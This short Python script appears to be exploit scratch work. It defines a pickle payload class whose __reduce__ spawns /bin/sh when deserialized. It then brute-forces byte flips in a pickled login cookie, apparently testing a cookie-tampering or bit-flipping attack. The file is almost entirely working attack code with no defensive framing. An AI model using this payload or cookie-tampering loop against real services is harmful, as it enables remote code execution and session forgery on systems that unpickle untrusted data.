#!/usr/bin/python

import pickle
import binascii
import subprocess

class RunBinSh(object):
  def __reduce__(self):
    return (subprocess.Popen, (('/bin/sh',),))

# print(pickle.dumps(RunBinSh()))
# print(binascii.hexlify(pickle.dumps(RunBinSh(), protocol=pickle.HIGHEST_PROTOCOL)))
# print(pickle.loads(pickle.dumps(RunBinSh())))

mydict = {"login":"ezigfdaifh",  "lastname":"cccdddd" }
cookie = pickle.dumps(mydict, protocol=pickle.HIGHEST_PROTOCOL)

cookie_ref = cookie
print(pickle.loads(cookie))
index = 7
for i in range(256):
    modified = i
    cookie = cookie[:index]+chr(modified^ord(cookie_ref[index]))+cookie[index+1:]
    try:
        print(pickle.loads(cookie))
        print("NICE "+str(i)+" "+chr(modified^ord(cookie_ref[index]))+"|")
        print(binascii.hexlify(cookie))
    except:
        pass
